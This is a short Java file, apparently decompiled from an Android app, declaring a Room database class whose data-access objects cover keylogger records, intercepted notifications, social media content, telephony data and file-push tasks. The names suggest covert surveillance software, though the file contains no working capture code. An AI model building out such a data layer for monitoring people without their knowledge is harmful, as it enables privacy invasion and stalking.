package com.hawkshaw.library.datalayer.room;

import androidx.room.A;
import com.hawkshaw.library.datalayer.room.files.PushFileTaskDao;
import com.hawkshaw.library.datalayer.room.keylogger.KeyLoggerDao;
import com.hawkshaw.library.datalayer.room.logger.LoggerDao;
import com.hawkshaw.library.datalayer.room.notification.NotificationDao;
import com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaDao;
import com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaDao;
import com.hawkshaw.library.datalayer.room.telephony.TelephonyDao;

public abstract class AppDatabase extends A {
    public abstract KeyLoggerDao keyLoggerDao();

    public abstract LoggerDao logDao();

    public abstract NotificationDao notificationDao();

    public abstract PushFileTaskDao pushFileTaskDao();

    public abstract SocialMediaDao socialMediaDao();

    public abstract TelephonyDao telephonyDao();

    public abstract UnprocessedSocialMediaDao unprocessedSocialMediaDao();
}
